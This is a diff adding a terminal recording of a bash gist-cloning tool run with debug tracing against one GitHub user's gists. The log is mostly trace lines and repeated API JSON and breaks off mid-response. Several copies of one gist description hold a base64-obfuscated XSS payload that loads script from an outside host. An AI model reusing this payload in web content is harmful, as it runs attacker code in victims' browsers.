@@ -1,0 +1,1133 @@
+Script started on Thu 16 Feb 2017 03:23:11 AM EST
+]0;super@msi: ~/GIT/decal/githose[01;31msuper@msi[00m:[01;34m~/GIT/decal/githose[00m$ ./gristhose-[K clone mandatoryprogrammer
+Username for 'https://github.com': decal
+
+
+^C^C^C^C
+]0;super@msi: ~/GIT/decal/githose[01;31msuper@msi[00m:[01;34m~/GIT/decal/githose[00m$ 
+]0;super@msi: ~/GIT/decal/githose[01;31msuper@msi[00m:[01;34m~/GIT/decal/githose[00m$ 
+]0;super@msi: ~/GIT/decal/githose[01;31msuper@msi[00m:[01;34m~/GIT/decal/githose[00m$ clear
+[3J[H[2J]0;super@msi: ~/GIT/decal/githose[01;31msuper@msi[00m:[01;34m~/GIT/decal/githose[00m$ clear./gristhose clone mandatoryprogrammer
+Username for 'https://github.com': decal
+
+
+^C^C^Z
+[1]+  Stopped                 ./gristhose clone mandatoryprogrammer
+]0;super@msi: ~/GIT/decal/githose[01;31msuper@msi[00m:[01;34m~/GIT/decal/githose[00m$ kill -9 %1
+
+[1]+  Stopped                 ./gristhose clone mandatoryprogrammer
+]0;super@msi: ~/GIT/decal/githose[01;31msuper@msi[00m:[01;34m~/GIT/decal/githose[00m$ kill -9 %1[K[K$1
+kill: usage: kill [-s sigspec | -n signum | -sigspec] pid | jobspec ... or kill -l [sigspec]
+[1]+  Killed                  ./gristhose clone mandatoryprogrammer
+]0;super@msi: ~/GIT/decal/githose[01;31msuper@msi[00m:[01;34m~/GIT/decal/githose[00m$ GITHOSE_DEBUG=1 ./gristhose clone mandatoryprogrammer
++ '[' -d ../inc ']'
++ '[' -d ../../inc ']'
++ source inc/colors
+++ '[' '!' ']'
+++ export $'esc=\E'
+++ esc=$'\E'
+++ export 'blackf=[30m' 'redf=[31m' 'greenf=[32m'
+++ blackf='[30m'
+++ redf='[31m'
+++ greenf='[32m'
+++ export 'yellowf=[33m' 'bluef=[34m' 'purplef=[35m'
+++ yellowf='[33m'
+++ bluef='[34m'
+++ purplef='[35m'
+++ export 'cyanf=[36m' 'whitef=[37m'
+++ cyanf='[36m'
+++ whitef='[37m'
+++ export 'blackb=[40m' 'redb=[41m' 'greenb=[42m'
+++ blackb='[40m'
+++ redb='[41m'
+++ greenb='[42m'
+++ export 'yellowb=[43m' 'blueb=[44m' 'purpleb=[45m'
+++ yellowb='[43m'
+++ blueb='[44m'
+++ purpleb='[45m'
+++ export 'cyanb=[46m' 'whiteb=[47m'
+++ cyanb='[46m'
+++ whiteb='[47m'
+++ export 'boldon=[1m' 'boldoff=[22m'
+++ boldon='[1m'
+++ boldoff='[22m'
+++ export 'italicson=[3m' 'italicsoff=[23m'
+++ italicson='[3m'
+++ italicsoff='[23m'
+++ export 'ulon=[4m' 'uloff=[24m'
+++ ulon='[4m'
+++ uloff='[24m'
+++ export 'invon=[7m' 'invoff=[27m'
+++ invon='[7m'
+++ invoff='[27m'
+++ export 'reset=[0m'
+++ reset='[0m'
++ source inc/regexes
+++ '[' '!' '' ']'
+++ export 'GITAA_REPO_REGEX=^([gI][tT][hH][uU][bB])?[rR][eE][pP][oO][:]+[/]*.*$'
+++ GITAA_REPO_REGEX='^([gI][tT][hH][uU][bB])?[rR][eE][pP][oO][:]+[/]*.*$'
+++ export 'GITAA_USER_REGEX=^([gG][tT][hH][uU][bB]|[uU][sS][eE][rR]|[gG][iI][tT][hH][uU][bB][sS][eE][rR])[:]+[/]*.*$'
+++ GITAA_USER_REGEX='^([gG][tT][hH][uU][bB]|[uU][sS][eE][rR]|[gG][iI][tT][hH][uU][bB][sS][eE][rR])[:]+[/]*.*$'
+++ export 'GITAA_USRS_REGEX=^([gG][iI][tT][hH][uU][bB])?[uU][sS][eE][rR][sS][:]+[/]+[?][a-zA-Z0-9_-]+([&]?([a-zA-Z0-9_-]+))*$'
+++ GITAA_USRS_REGEX='^([gG][iI][tT][hH][uU][bB])?[uU][sS][eE][rR][sS][:]+[/]+[?][a-zA-Z0-9_-]+([&]?([a-zA-Z0-9_-]+))*$'
+++ export 'GITAA_GITS_REGEX=^[gG][iI][tT][sS]?[:]+[/]+.*$'
+++ GITAA_GITS_REGEX='^[gG][iI][tT][sS]?[:]+[/]+.*$'
+++ export 'GITAA_GIST_REGEX=[gG][iI][sS][tT][.:][/]*'
+++ GITAA_GIST_REGEX='[gG][iI][sS][tT][.:][/]*'
+++ export 'GITAA_LINK_REGEX=^(([gG][iI][tT]|[hH][tT][tT][pP])[sS]?[:]+[/]+[a-zA-Z.]+[/][a-zA-Z0-9_-]+[/]+[a-zA-Z0-9_-]+[/]+[a-zA-Z0-9_-]+[/]+[a-zA-Z0-9_-]+.*$'
+++ GITAA_LINK_REGEX='^(([gG][iI][tT]|[hH][tT][tT][pP])[sS]?[:]+[/]+[a-zA-Z.]+[/][a-zA-Z0-9_-]+[/]+[a-zA-Z0-9_-]+[/]+[a-zA-Z0-9_-]+[/]+[a-zA-Z0-9_-]+.*$'
++ source inc/usages
+++ [[ 1 -ne 0 ]]
+++ set -x
+++ '[' -d ../inc ']'
+++ '[' -d ../../inc ']'
+++ source -- inc/colors
++++ '[' '!' $'\E' ']'
++++ '[' '!' '[0m' ']'
++ source etc/githose.conf
+++ export 'GITAA_REPO_REGEX=^([gI][tT][hH][uU][bB])?[rR][eE][pP][oO][:]+[/]*.*$'
+++ GITAA_REPO_REGEX='^([gI][tT][hH][uU][bB])?[rR][eE][pP][oO][:]+[/]*.*$'
+++ export 'GITAA_GITS_REGEX=^[gG][iI][tT][sS][:]+[/]+.*$'
+++ GITAA_GITS_REGEX='^[gG][iI][tT][sS][:]+[/]+.*$'
+++ export 'GITAA_GIST_REGEX=[gG][iI][sS][tT][.:][/]*'
+++ GITAA_GIST_REGEX='[gG][iI][sS][tT][.:][/]*'
+++ export 'GITAA_LINK_REGEX=^(([gG][iI][tT]|[hH][tT][tT][pP])[sS]?[:]+[/]+[a-zA-Z.]+[/][a-zA-Z0-9_-]+[/]+[a-zA-Z0-9_-]+[/]+[a-zA-Z0-9_-]+[/]+[a-zA-Z0-9_-]+.*$'
+++ GITAA_LINK_REGEX='^(([gG][iI][tT]|[hH][tT][tT][pP])[sS]?[:]+[/]+[a-zA-Z.]+[/][a-zA-Z0-9_-]+[/]+[a-zA-Z0-9_-]+[/]+[a-zA-Z0-9_-]+[/]+[a-zA-Z0-9_-]+.*$'
+++ export GITAA_PATH_CLONE=/home/super/github
+++ GITAA_PATH_CLONE=/home/super/github
+++ export GITAA_PATH_REPOS=/home/super/repos
+++ GITAA_PATH_REPOS=/home/super/repos
+++ export GITAA_PATH_GISTS=/home/super/gists
+++ GITAA_PATH_GISTS=/home/super/gists
+++ export GITHOSE_MODE_UMASK=0077
+++ GITHOSE_MODE_UMASK=0077
+++ export GITHOSE_MODE_UMASK=0077
+++ GITHOSE_MODE_UMASK=0077
+++ export GITHOSE_MODE_CDIRS=0700
+++ GITHOSE_MODE_CDIRS=0700
+++ export GITHOSE_JOBS_COUNT=64
+++ GITHOSE_JOBS_COUNT=64
+++ export GIST_PATH_COPY=/home/super/gists
+++ GIST_PATH_COPY=/home/super/gists
+++ export GIST_WGET_WAIT=22
+++ GIST_WGET_WAIT=22
+++ export GIST_TASK_JOBS=8
+++ GIST_TASK_JOBS=8
+++ export GIST_MODE_MASK=0027
+++ GIST_MODE_MASK=0027
+++ export GIST_MODE_DIRS=0700
+++ GIST_MODE_DIRS=0700
++ [[ 0 -ne 0 ]]
++ [[ ./gristhose =~ grist ]]
++ '[' clone ']'
++ '[' mandatoryprogrammer ']'
++ [[ clone =~ ^clone ]]
+++ basename ./gristhose
++ export GITHOSE_ARGV0=gristhose
++ GITHOSE_ARGV0=gristhose
++ lib/driver clone mandatoryprogrammer
++ '[' -d ../inc ']'
++ source inc/colors
+++ '[' '!' $'\E' ']'
+++ '[' '!' '[0m' ']'
++ source inc/regexes
+++ '[' '!' '^([gI][tT][hH][uU][bB])?[rR][eE][pP][oO][:]+[/]*.*$' ']'
++ declare -i k=1
++ [[ 1 -ne 0 ]]
++ k=0
++ lib/typeof clone mandatoryprogrammer
++ '[' -d ../inc ']'
++ source inc/inits
+++ '[' '!' ']'
++++ grep 'cpu cores' /proc/cpuinfo
++++ cut -d : -f2
++++ head -1
++++ sed 's/[ ]*$//;s/^[ ]*//'
+++ export GITHOSE_NUM_JOBS=4
+++ GITHOSE_NUM_JOBS=4
+++ declare -i initLoaded=1
+++ declare -i verboseFlag=1
+++ declare githosePath=githose
++ source inc/regexes
+++ '[' '!' '^([gI][tT][hH][uU][bB])?[rR][eE][pP][oO][:]+[/]*.*$' ']'
++ source inc/usages
+++ [[ 1 -ne 0 ]]
+++ set -x
+++ '[' -d ../inc ']'
+++ '[' -d ../../inc ']'
+++ source -- inc/colors
++++ '[' '!' $'\E' ']'
++++ '[' '!' '[0m' ']'
++ '[' clone ']'
++ [[ clone =~ ^help ]]
++ [[ clone =~ ^set ]]
++ lib/misc/set mandatoryprogrammer ''
++ readonly settingField=mandatoryprogrammer settingValue=
++ settingField=mandatoryprogrammer
++ settingValue=
++ source inc/colors
+++ '[' '!' $'\E' ']'
+++ '[' '!' '[0m' ']'
++ [[ gristhose =~ gist ]]
++ [[ gristhose =~ git ]]
++ [[ gristhose =~ grist ]]
++ export githosePath=gristhose
++ githosePath=gristhose
++ '[' '!' gristhose ']'
++ [[ clone =~ ^clone ]]
++ [[ mandatoryprogrammer =~ ^help ]]
++ lib/gristhose/clone mandatoryprogrammer
++ declare gristUsers=mandatoryprogrammer
++ parallel -j8 ./githose clone '{1}' ::: mandatoryprogrammer
+Username for 'https://github.com': ^C+ parallel -j8 ./gisthose clone '{1}' ::: mandatoryprogrammer
+[35mlib/gisthose/clone[37m[1m:[22m [34mFetching Text of All Gists for[37m[1m:[22m [0m[7mmandatoryprogrammer[0m
+[37m[3m
+[32m[4mgistfile1.txt[24m [4mgistfile1.txt[24m [4myoober[24m 
+[0m
+[0m[35mlib/gisthose/clone[37m[1m:[22m [42mFinished Cloning All Gists From[37m[1m:[0m [7mmandatoryprogrammer[0m
+ [0m+ '[' -d ../inc ']'
++ '[' -d ../../inc ']'
++ source inc/colors
+++ '[' '!' $'\E' ']'
+++ '[' '!' '[0m' ']'
++ source inc/regexes
+++ '[' '!' '^([gI][tT][hH][uU][bB])?[rR][eE][pP][oO][:]+[/]*.*$' ']'
++ source inc/usages
+++ [[ 1 -ne 0 ]]
+++ set -x
+++ '[' -d ../inc ']'
+++ '[' -d ../../inc ']'
+++ source -- inc/colors
++++ '[' '!' $'\E' ']'
++++ '[' '!' '[0m' ']'
++ source etc/githose.conf
+++ export 'GITAA_REPO_REGEX=^([gI][tT][hH][uU][bB])?[rR][eE][pP][oO][:]+[/]*.*$'
+++ GITAA_REPO_REGEX='^([gI][tT][hH][uU][bB])?[rR][eE][pP][oO][:]+[/]*.*$'
+++ export 'GITAA_GITS_REGEX=^[gG][iI][tT][sS][:]+[/]+.*$'
+++ GITAA_GITS_REGEX='^[gG][iI][tT][sS][:]+[/]+.*$'
+++ export 'GITAA_GIST_REGEX=[gG][iI][sS][tT][.:][/]*'
+++ GITAA_GIST_REGEX='[gG][iI][sS][tT][.:][/]*'
+++ export 'GITAA_LINK_REGEX=^(([gG][iI][tT]|[hH][tT][tT][pP])[sS]?[:]+[/]+[a-zA-Z.]+[/][a-zA-Z0-9_-]+[/]+[a-zA-Z0-9_-]+[/]+[a-zA-Z0-9_-]+[/]+[a-zA-Z0-9_-]+.*$'
+++ GITAA_LINK_REGEX='^(([gG][iI][tT]|[hH][tT][tT][pP])[sS]?[:]+[/]+[a-zA-Z.]+[/][a-zA-Z0-9_-]+[/]+[a-zA-Z0-9_-]+[/]+[a-zA-Z0-9_-]+[/]+[a-zA-Z0-9_-]+.*$'
+++ export GITAA_PATH_CLONE=/home/super/github
+++ GITAA_PATH_CLONE=/home/super/github
+++ export GITAA_PATH_REPOS=/home/super/repos
+++ GITAA_PATH_REPOS=/home/super/repos
+++ export GITAA_PATH_GISTS=/home/super/gists
+++ GITAA_PATH_GISTS=/home/super/gists
+++ export GITHOSE_MODE_UMASK=0077
+++ GITHOSE_MODE_UMASK=0077
+++ export GITHOSE_MODE_UMASK=0077
+++ GITHOSE_MODE_UMASK=0077
+++ export GITHOSE_MODE_CDIRS=0700
+++ GITHOSE_MODE_CDIRS=0700
+++ export GITHOSE_JOBS_COUNT=64
+++ GITHOSE_JOBS_COUNT=64
+++ export GIST_PATH_COPY=/home/super/gists
+++ GIST_PATH_COPY=/home/super/gists
+++ export GIST_WGET_WAIT=22
+++ GIST_WGET_WAIT=22
+++ export GIST_TASK_JOBS=8
+++ GIST_TASK_JOBS=8
+++ export GIST_MODE_MASK=0027
+++ GIST_MODE_MASK=0027
+++ export GIST_MODE_DIRS=0700
+++ GIST_MODE_DIRS=0700
++ [[ 0 -ne 0 ]]
++ [[ ./gisthose =~ grist ]]
++ [[ ./gisthose =~ gist ]]
++ '[' clone ']'
++ '[' mandatoryprogrammer ']'
++ [[ clone =~ ^clone ]]
+++ basename ./gisthose
++ export GITHOSE_ARGV0=gisthose
++ GITHOSE_ARGV0=gisthose
++ lib/driver clone mandatoryprogrammer
++ '[' -d ../inc ']'
++ source inc/colors
+++ '[' '!' $'\E' ']'
+++ '[' '!' '[0m' ']'
++ source inc/regexes
+++ '[' '!' '^([gI][tT][hH][uU][bB])?[rR][eE][pP][oO][:]+[/]*.*$' ']'
++ declare -i k=1
++ [[ 1 -ne 0 ]]
++ k=0
++ lib/typeof clone mandatoryprogrammer
++ '[' -d ../inc ']'
++ source inc/inits
+++ '[' '!' ']'
++++ grep 'cpu cores' /proc/cpuinfo
++++ cut -d : -f2
++++ head -1
++++ sed 's/[ ]*$//;s/^[ ]*//'
+++ export GITHOSE_NUM_JOBS=4
+++ GITHOSE_NUM_JOBS=4
+++ declare -i initLoaded=1
+++ declare -i verboseFlag=1
+++ declare githosePath=githose
++ source inc/regexes
+++ '[' '!' '^([gI][tT][hH][uU][bB])?[rR][eE][pP][oO][:]+[/]*.*$' ']'
++ source inc/usages
+++ [[ 1 -ne 0 ]]
+++ set -x
+++ '[' -d ../inc ']'
+++ '[' -d ../../inc ']'
+++ source -- inc/colors
++++ '[' '!' $'\E' ']'
++++ '[' '!' '[0m' ']'
++ '[' clone ']'
++ [[ clone =~ ^help ]]
++ [[ clone =~ ^set ]]
++ lib/misc/set mandatoryprogrammer ''
++ readonly settingField=mandatoryprogrammer settingValue=
++ settingField=mandatoryprogrammer
++ settingValue=
++ source inc/colors
+++ '[' '!' $'\E' ']'
+++ '[' '!' '[0m' ']'
++ [[ gisthose =~ gist ]]
++ export githosePath=gisthose
++ githosePath=gisthose
++ '[' '!' gisthose ']'
++ [[ clone =~ ^clone ]]
++ [[ mandatoryprogrammer =~ ^help ]]
++ lib/gisthose/clone mandatoryprogrammer
++ declare gistUser=mandatoryprogrammer
++ '[' '!' -d /home/super/gists ']'
++ chmod -- 0700 /home/super/gists
++ '[' 0 -ne 0 ']'
++ cd -- /home/super/gists
++ '[' '!' -d mandatoryprogrammer ']'
++ cd -- mandatoryprogrammer
++ declare -xi waresDaWarez=0
++ true
++ waresDaWarez=1
+++ curl -s https://api.github.com/users/mandatoryprogrammer/gists
++ declare 'outputStr=[
+  {
+    "url": "https://api.github.com/gists/3f5990f294c6fc79ebe071e804411dab",
+    "forks_url": "https://api.github.com/gists/3f5990f294c6fc79ebe071e804411dab/forks",
+    "commits_url": "https://api.github.com/gists/3f5990f294c6fc79ebe071e804411dab/commits",
+    "id": "3f5990f294c6fc79ebe071e804411dab",
+    "git_pull_url": "https://gist.github.com/3f5990f294c6fc79ebe071e804411dab.git",
+    "git_push_url": "https://gist.github.com/3f5990f294c6fc79ebe071e804411dab.git",
+    "html_url": "https://gist.github.com/3f5990f294c6fc79ebe071e804411dab",
+    "files": {
+      "gistfile1.txt": {
+        "filename": "gistfile1.txt",
+        "type": "text/plain",
+        "language": "Text",
+        "raw_url": "https://gist.githubusercontent.com/mandatoryprogrammer/3f5990f294c6fc79ebe071e804411dab/raw/f0185b1ab3c5fa1e2cdab3141243781f7d3c523b/gistfile1.txt",
+        "size": 3097
+      }
+    },
+    "public": true,
+    "created_at": "2016-04-15T05:56:37Z",
+    "updated_at": "2016-04-15T05:56:37Z",
+    "description": "",
+    "comments": 0,
+    "user": null,
+    "comments_url": "https://api.github.com/gists/3f5990f294c6fc79ebe071e804411dab/comments",
+    "owner": {
+      "login": "mandatoryprogrammer",
+      "id": 5349141,
+      "avatar_url": "https://avatars.githubusercontent.com/u/5349141?v=3",
+      "gravatar_id": "",
+      "url": "https://api.github.com/users/mandatoryprogrammer",
+      "html_url": "https://github.com/mandatoryprogrammer",
+      "followers_url": "https://api.github.com/users/mandatoryprogrammer/followers",
+      "following_url": "https://api.github.com/users/mandatoryprogrammer/following{/other_user}",
+      "gists_url": "https://api.github.com/users/mandatoryprogrammer/gists{/gist_id}",
+      "starred_url": "https://api.github.com/users/mandatoryprogrammer/starred{/owner}{/repo}",
+      "subscriptions_url": "https://api.github.com/users/mandatoryprogrammer/subscriptions",
+      "organizations_url": "https://api.github.com/users/mandatoryprogrammer/orgs",
+      "repos_url": "https://api.github.com/users/mandatoryprogrammer/repos",
+      "events_url": "https://api.github.com/users/mandatoryprogrammer/events{/privacy}",
+      "received_events_url": "https://api.github.com/users/mandatoryprogrammer/received_events",
+      "type": "User",
+      "site_admin": false
+    },
+    "truncated": false
+  },
+  {
+    "url": "https://api.github.com/gists/d7de8a6d787c81971efc",
+    "forks_url": "https://api.github.com/gists/d7de8a6d787c81971efc/forks",
+    "commits_url": "https://api.github.com/gists/d7de8a6d787c81971efc/commits",
+    "id": "d7de8a6d787c81971efc",
+    "git_pull_url": "https://gist.github.com/d7de8a6d787c81971efc.git",
+    "git_push_url": "https://gist.github.com/d7de8a6d787c81971efc.git",
+    "html_url": "https://gist.github.com/d7de8a6d787c81971efc",
+    "files": {
+      "gistfile1.txt": {
+        "filename": "gistfile1.txt",
+        "type": "text/plain",
+        "language": "Text",
+        "raw_url": "https://gist.githubusercontent.com/mandatoryprogrammer/d7de8a6d787c81971efc/raw/4837d3cc43906a4d5661e7ea0d6aefaf08eefad9/gistfile1.txt",
+        "size": 1463
+      }
+    },
+    "public": true,
+    "created_at": "2015-10-20T23:38:09Z",
+    "updated_at": "2015-10-20T23:38:09Z",
+    "description": "<img src=x onerror=eval(atob(this.id)) id=dmFyIHBheWxvYWQ9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7cGF5bG9hZC5zcmM9Ii8vbGgubGMiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQocGF5bG9hZCk7>",
+    "comments": 0,
+    "user": null,
+    "comments_url": "https://api.github.com/gists/d7de8a6d787c81971efc/comments",
+    "owner": {
+      "login": "mandatoryprogrammer",
+      "id": 5349141,
+      "avatar_url": "https://avatars.githubusercontent.com/u/5349141?v=3",
+      "gravatar_id": "",
+      "url": "https://api.github.com/users/mandatoryprogrammer",
+      "html_url": "https://github.com/mandatoryprogrammer",
+      "followers_url": "https://api.github.com/users/mandatoryprogrammer/followers",
+      "following_url": "https://api.github.com/users/mandatoryprogrammer/following{/other_user}",
+      "gists_url": "https://api.github.com/users/mandatoryprogrammer/gists{/gist_id}",
+      "starred_url": "https://api.github.com/users/mandatoryprogrammer/starred{/owner}{/repo}",
+      "subscriptions_url": "https://api.github.com/users/mandatoryprogrammer/subscriptions",
+      "organizations_url": "https://api.github.com/users/mandatoryprogrammer/orgs",
+      "repos_url": "https://api.github.com/users/mandatoryprogrammer/repos",
+      "events_url": "https://api.github.com/users/mandatoryprogrammer/events{/privacy}",
+      "received_events_url": "https://api.github.com/users/mandatoryprogrammer/received_events",
+      "type": "User",
+      "site_admin": false
+    },
+    "truncated": false
+  },
+  {
+    "url": "https://api.github.com/gists/e9b994529bfa1908de2c",
+    "forks_url": "https://api.github.com/gists/e9b994529bfa1908de2c/forks",
+    "commits_url": "https://api.github.com/gists/e9b994529bfa1908de2c/commits",
+    "id": "e9b994529bfa1908de2c",
+    "git_pull_url": "https://gist.github.com/e9b994529bfa1908de2c.git",
+    "git_push_url": "https://gist.github.com/e9b994529bfa1908de2c.git",
+    "html_url": "https://gist.github.com/e9b994529bfa1908de2c",
+    "files": {
+      "yoober": {
+        "filename": "yoober",
+        "type": "text/plain",
+        "language": null,
+        "raw_url": "https://gist.githubusercontent.com/mandatoryprogrammer/e9b994529bfa1908de2c/raw/618a5d5dccf828e8bc11d5884ae3cb398224bcfe/yoober",
+        "size": 67
+      }
+    },
+    "public": true,
+    "created_at": "2015-10-14T16:20:49Z",
+    "updated_at": "2015-10-14T16:20:51Z",
+    "description": "",
+    "comments": 0,
+    "user": null,
+    "comments_url": "https://api.github.com/gists/e9b994529bfa1908de2c/comments",
+    "owner": {
+      "login": "mandatoryprogrammer",
+      "id": 5349141,
+      "avatar_url": "https://avatars.githubusercontent.com/u/5349141?v=3",
+      "gravatar_id": "",
+      "url": "https://api.github.com/users/mandatoryprogrammer",
+      "html_url": "https://github.com/mandatoryprogrammer",
+      "followers_url": "https://api.github.com/users/mandatoryprogrammer/followers",
+      "following_url": "https://api.github.com/users/mandatoryprogrammer/following{/other_user}",
+      "gists_url": "https://api.github.com/users/mandatoryprogrammer/gists{/gist_id}",
+      "starred_url": "https://api.github.com/users/mandatoryprogrammer/starred{/owner}{/repo}",
+      "subscriptions_url": "https://api.github.com/users/mandatoryprogrammer/subscriptions",
+      "organizations_url": "https://api.github.com/users/mandatoryprogrammer/orgs",
+      "repos_url": "https://api.github.com/users/mandatoryprogrammer/repos",
+      "events_url": "https://api.github.com/users/mandatoryprogrammer/events{/privacy}",
+      "received_events_url": "https://api.github.com/users/mandatoryprogrammer/received_events",
+      "type": "User",
+      "site_admin": false
+    },
+    "truncated": false
+  }
+]'
++ '[' '!' '[
+  {
+    "url": "https://api.github.com/gists/3f5990f294c6fc79ebe071e804411dab",
+    "forks_url": "https://api.github.com/gists/3f5990f294c6fc79ebe071e804411dab/forks",
+    "commits_url": "https://api.github.com/gists/3f5990f294c6fc79ebe071e804411dab/commits",
+    "id": "3f5990f294c6fc79ebe071e804411dab",
+    "git_pull_url": "https://gist.github.com/3f5990f294c6fc79ebe071e804411dab.git",
+    "git_push_url": "https://gist.github.com/3f5990f294c6fc79ebe071e804411dab.git",
+    "html_url": "https://gist.github.com/3f5990f294c6fc79ebe071e804411dab",
+    "files": {
+      "gistfile1.txt": {
+        "filename": "gistfile1.txt",
+        "type": "text/plain",
+        "language": "Text",
+        "raw_url": "https://gist.githubusercontent.com/mandatoryprogrammer/3f5990f294c6fc79ebe071e804411dab/raw/f0185b1ab3c5fa1e2cdab3141243781f7d3c523b/gistfile1.txt",
+        "size": 3097
+      }
+    },
+    "public": true,
+    "created_at": "2016-04-15T05:56:37Z",
+    "updated_at": "2016-04-15T05:56:37Z",
+    "description": "",
+    "comments": 0,
+    "user": null,
+    "comments_url": "https://api.github.com/gists/3f5990f294c6fc79ebe071e804411dab/comments",
+    "owner": {
+      "login": "mandatoryprogrammer",
+      "id": 5349141,
+      "avatar_url": "https://avatars.githubusercontent.com/u/5349141?v=3",
+      "gravatar_id": "",
+      "url": "https://api.github.com/users/mandatoryprogrammer",
+      "html_url": "https://github.com/mandatoryprogrammer",
+      "followers_url": "https://api.github.com/users/mandatoryprogrammer/followers",
+      "following_url": "https://api.github.com/users/mandatoryprogrammer/following{/other_user}",
+      "gists_url": "https://api.github.com/users/mandatoryprogrammer/gists{/gist_id}",
+      "starred_url": "https://api.github.com/users/mandatoryprogrammer/starred{/owner}{/repo}",
+      "subscriptions_url": "https://api.github.com/users/mandatoryprogrammer/subscriptions",
+      "organizations_url": "https://api.github.com/users/mandatoryprogrammer/orgs",
+      "repos_url": "https://api.github.com/users/mandatoryprogrammer/repos",
+      "events_url": "https://api.github.com/users/mandatoryprogrammer/events{/privacy}",
+      "received_events_url": "https://api.github.com/users/mandatoryprogrammer/received_events",
+      "type": "User",
+      "site_admin": false
+    },
+    "truncated": false
+  },
+  {
+    "url": "https://api.github.com/gists/d7de8a6d787c81971efc",
+    "forks_url": "https://api.github.com/gists/d7de8a6d787c81971efc/forks",
+    "commits_url": "https://api.github.com/gists/d7de8a6d787c81971efc/commits",
+    "id": "d7de8a6d787c81971efc",
+    "git_pull_url": "https://gist.github.com/d7de8a6d787c81971efc.git",
+    "git_push_url": "https://gist.github.com/d7de8a6d787c81971efc.git",
+    "html_url": "https://gist.github.com/d7de8a6d787c81971efc",
+    "files": {
+      "gistfile1.txt": {
+        "filename": "gistfile1.txt",
+        "type": "text/plain",
+        "language": "Text",
+        "raw_url": "https://gist.githubusercontent.com/mandatoryprogrammer/d7de8a6d787c81971efc/raw/4837d3cc43906a4d5661e7ea0d6aefaf08eefad9/gistfile1.txt",
+        "size": 1463
+      }
+    },
+    "public": true,
+    "created_at": "2015-10-20T23:38:09Z",
+    "updated_at": "2015-10-20T23:38:09Z",
+    "description": "<img src=x onerror=eval(atob(this.id)) id=dmFyIHBheWxvYWQ9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7cGF5bG9hZC5zcmM9Ii8vbGgubGMiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQocGF5bG9hZCk7>",
+    "comments": 0,
+    "user": null,
+    "comments_url": "https://api.github.com/gists/d7de8a6d787c81971efc/comments",
+    "owner": {
+      "login": "mandatoryprogrammer",
+      "id": 5349141,
+      "avatar_url": "https://avatars.githubusercontent.com/u/5349141?v=3",
+      "gravatar_id": "",
+      "url": "https://api.github.com/users/mandatoryprogrammer",
+      "html_url": "https://github.com/mandatoryprogrammer",
+      "followers_url": "https://api.github.com/users/mandatoryprogrammer/followers",
+      "following_url": "https://api.github.com/users/mandatoryprogrammer/following{/other_user}",
+      "gists_url": "https://api.github.com/users/mandatoryprogrammer/gists{/gist_id}",
+      "starred_url": "https://api.github.com/users/mandatoryprogrammer/starred{/owner}{/repo}",
+      "subscriptions_url": "https://api.github.com/users/mandatoryprogrammer/subscriptions",
+      "organizations_url": "https://api.github.com/users/mandatoryprogrammer/orgs",
+      "repos_url": "https://api.github.com/users/mandatoryprogrammer/repos",
+      "events_url": "https://api.github.com/users/mandatoryprogrammer/events{/privacy}",
+      "received_events_url": "https://api.github.com/users/mandatoryprogrammer/received_events",
+      "type": "User",
+      "site_admin": false
+    },
+    "truncated": false
+  },
+  {
+    "url": "https://api.github.com/gists/e9b994529bfa1908de2c",
+    "forks_url": "https://api.github.com/gists/e9b994529bfa1908de2c/forks",
+    "commits_url": "https://api.github.com/gists/e9b994529bfa1908de2c/commits",
+    "id": "e9b994529bfa1908de2c",
+    "git_pull_url": "https://gist.github.com/e9b994529bfa1908de2c.git",
+    "git_push_url": "https://gist.github.com/e9b994529bfa1908de2c.git",
+    "html_url": "https://gist.github.com/e9b994529bfa1908de2c",
+    "files": {
+      "yoober": {
+        "filename": "yoober",
+        "type": "text/plain",
+        "language": null,
+        "raw_url": "https://gist.githubusercontent.com/mandatoryprogrammer/e9b994529bfa1908de2c/raw/618a5d5dccf828e8bc11d5884ae3cb398224bcfe/yoober",
+        "size": 67
+      }
+    },
+    "public": true,
+    "created_at": "2015-10-14T16:20:49Z",
+    "updated_at": "2015-10-14T16:20:51Z",
+    "description": "",
+    "comments": 0,
+    "user": null,
+    "comments_url": "https://api.github.com/gists/e9b994529bfa1908de2c/comments",
+    "owner": {
+      "login": "mandatoryprogrammer",
+      "id": 5349141,
+      "avatar_url": "https://avatars.githubusercontent.com/u/5349141?v=3",
+      "gravatar_id": "",
+      "url": "https://api.github.com/users/mandatoryprogrammer",
+      "html_url": "https://github.com/mandatoryprogrammer",
+      "followers_url": "https://api.github.com/users/mandatoryprogrammer/followers",
+      "following_url": "https://api.github.com/users/mandatoryprogrammer/following{/other_user}",
+      "gists_url": "https://api.github.com/users/mandatoryprogrammer/gists{/gist_id}",
+      "starred_url": "https://api.github.com/users/mandatoryprogrammer/starred{/owner}{/repo}",
+      "subscriptions_url": "https://api.github.com/users/mandatoryprogrammer/subscriptions",
+      "organizations_url": "https://api.github.com/users/mandatoryprogrammer/orgs",
+      "repos_url": "https://api.github.com/users/mandatoryprogrammer/repos",
+      "events_url": "https://api.github.com/users/mandatoryprogrammer/events{/privacy}",
+      "received_events_url": "https://api.github.com/users/mandatoryprogrammer/received_events",
+      "type": "User",
+      "site_admin": false
+    },
+    "truncated": false
+  }
+]' ']'
+++ grep 'ate limit'
+++ echo '[
+  {
+    "url": "https://api.github.com/gists/3f5990f294c6fc79ebe071e804411dab",
+    "forks_url": "https://api.github.com/gists/3f5990f294c6fc79ebe071e804411dab/forks",
+    "commits_url": "https://api.github.com/gists/3f5990f294c6fc79ebe071e804411dab/commits",
+    "id": "3f5990f294c6fc79ebe071e804411dab",
+    "git_pull_url": "https://gist.github.com/3f5990f294c6fc79ebe071e804411dab.git",
+    "git_push_url": "https://gist.github.com/3f5990f294c6fc79ebe071e804411dab.git",
+    "html_url": "https://gist.github.com/3f5990f294c6fc79ebe071e804411dab",
+    "files": {
+      "gistfile1.txt": {
+        "filename": "gistfile1.txt",
+        "type": "text/plain",
+        "language": "Text",
+        "raw_url": "https://gist.githubusercontent.com/mandatoryprogrammer/3f5990f294c6fc79ebe071e804411dab/raw/f0185b1ab3c5fa1e2cdab3141243781f7d3c523b/gistfile1.txt",
+        "size": 3097
+      }
+    },
+    "public": true,
+    "created_at": "2016-04-15T05:56:37Z",
+    "updated_at": "2016-04-15T05:56:37Z",
+    "description": "",
+    "comments": 0,
+    "user": null,
